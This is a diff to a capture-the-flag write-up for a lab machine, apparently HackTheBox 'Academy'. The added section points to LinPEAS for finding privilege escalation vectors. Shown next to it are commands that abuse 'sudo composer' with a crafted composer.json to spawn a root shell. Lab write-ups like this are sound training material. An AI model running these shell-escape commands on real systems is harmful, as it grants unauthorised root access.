@@ -64,6 +64,9 @@ ls /home/
 Login attempt with the cry0l1t3 user was successed and we got the user.txt flag  
 ![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/user%20flag.PNG)
 
+User2
+---------
+Let's use [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to find some privilege escalation vector
 TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
 sudo composer --working-dir=$TF run-script x
